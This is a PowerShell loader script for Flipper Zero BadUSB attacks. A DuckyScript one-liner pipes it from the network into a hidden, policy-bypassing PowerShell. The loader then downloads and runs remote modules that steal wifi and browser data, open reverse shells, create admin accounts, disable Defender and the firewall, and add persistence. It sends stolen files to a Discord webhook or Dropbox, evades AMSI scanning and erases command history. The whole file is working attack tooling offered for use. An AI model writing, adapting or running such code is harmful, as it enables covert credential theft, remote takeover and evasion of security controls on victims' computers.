# ============================================================
# Universal Payload Loader for Flipper Zero BadUSB
# ============================================================
# This loader receives configuration via environment variables
# and dynamically loads the appropriate payload module.
#
# Usage from DuckyScript:
# STRING powershell -w h -ep bypass "$env:DC='webhook';$env:M='wifi';irm URL/loader.ps1|iex"
#
# Note: This loader uses download-to-disk execution to reduce AMSI detection.
# The initial "irm|iex" is unavoidable for the loader itself, but all modules
# are downloaded to %TEMP% and executed from disk rather than in-memory.
#
# Variables:
#   $env:DC  = Discord webhook URL
#   $env:DB  = Dropbox token (optional)
#   $env:M   = Module to load (wifi, screenshot, sysinfo, etc.)
#   $env:IP  = Attacker IP (for reverse shells)
#   $env:PT  = Port (for reverse shells)
#   $env:U   = Custom URL (for some payloads)
# ============================================================

# Base URL for remote payloads (change to your repo)
$global:BASE_URL = if ($env:BASE_URL) { $env:BASE_URL } else { "https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads" }

# Error handling
$ErrorActionPreference = 'SilentlyContinue'

# Module mappings
$modules = @{
    # Exfiltration
    'wifi'       = 'windows/exfil/wifi_grabber.ps1'
    'screenshot' = 'windows/exfil/screenshot.ps1'
    'sysinfo'    = 'windows/exfil/system_info.ps1'
    'browser'    = 'windows/exfil/browser_data.ps1'
    'clipboard'  = 'windows/exfil/clipboard.ps1'
    'ip'         = 'windows/exfil/ip_info.ps1'
    
    # Execution
    'shell'      = 'windows/execution/reverse_shell.ps1'
    'admin'      = 'windows/execution/create_admin.ps1'
    'rdp'        = 'windows/execution/enable_rdp.ps1'
    'defender'   = 'windows/execution/disable_defender.ps1'
    'firewall'   = 'windows/execution/disable_firewall.ps1'
    
    # Fun/Pranks
    'wallpaper'  = 'windows/fun/wallpaper_changer.ps1'
    'tts'        = 'windows/fun/text_to_speech.ps1'
    'rickroll'   = 'windows/fun/rickroll.ps1'
    'bsod'       = 'windows/fun/fake_bsod.ps1'
    
    # Recon
    'recon'      = 'windows/recon/full_recon.ps1'
    'network'    = 'windows/recon/network_scan.ps1'
    
    # Persistence
    'persist'    = 'windows/persistence/startup.ps1'
}

# Helper: Send to Discord
function Send-Discord {
    param([string]$Content, [string]$FilePath)
    
    if (-not $env:DC) { return $false }
    
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            # Try upload via curl
            if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
            curl.exe -F "file1=@$FilePath" -F "payload_json={`"content`":`"$Content`"}" $env:DC 2>$null | Out-Null
            } else {
                # Fallback if curl missing: Send text notification
                $msg = "$Content`n`n⚠️ [File not uploaded: curl.exe missing]"
                $body = @{content = $msg} | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri $env:DC -Method Post -Body $body -ContentType 'application/json' 2>$null | Out-Null
            }
        } else {
            # Send text
            $body = @{content = $Content} | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri $env:DC -Method Post -Body $body -ContentType 'application/json' 2>$null | Out-Null
        }
        return $true
    } catch { return $false }
}

# Helper: Send to Dropbox
function Send-Dropbox {
    param([string]$Content, [string]$FileName)
    
    if (-not $env:DB) { return $false }
    
    try {
        $headers = @{
            "Authorization" = "Bearer $env:DB"
            "Content-Type" = "application/octet-stream"
            "Dropbox-API-Arg" = "{`"path`":`"/$FileName`",`"mode`":`"overwrite`"}"
        }
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $Content 2>$null | Out-Null
        return $true
    } catch { return $false }
}

# Helper: Get system identifier
function Get-SystemID {
    return "$env:COMPUTERNAME-$env:USERNAME"
}

# Helper: Cleanup traces
function Clear-Traces {
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
        Clear-History
    } catch {}
}

# Load and execute module (download-to-disk method to avoid IEX detection)
function Invoke-Module {
    param([string]$ModuleName)
    
    if (-not $modules.ContainsKey($ModuleName)) {
        $path = $ModuleName
    } else {
        $path = $modules[$ModuleName]
    }
    
    $url = "$global:BASE_URL/$path"
    $tmp = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).ps1"
    
    try {
        # Download to disk instead of memory (bypasses AMSI in-memory scanning)
        (New-Object Net.WebClient).DownloadFile($url, $tmp)
        
        if (Test-Path $tmp) {
            # Execute from disk with & operator (not IEX)
            & $tmp
        }
    } catch {
        # Fallback: ScriptBlock method (still better than raw IEX)
        try {
            $code = (New-Object Net.WebClient).DownloadString($url)
            . ([scriptblock]::Create($code))
        } catch {
            Send-Discord "❌ Failed to load module: $ModuleName"
        }
    } finally {
        # Always cleanup
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
    }
}

# Main execution
if ($env:M) {
    Invoke-Module -ModuleName $env:M
    Clear-Traces
}

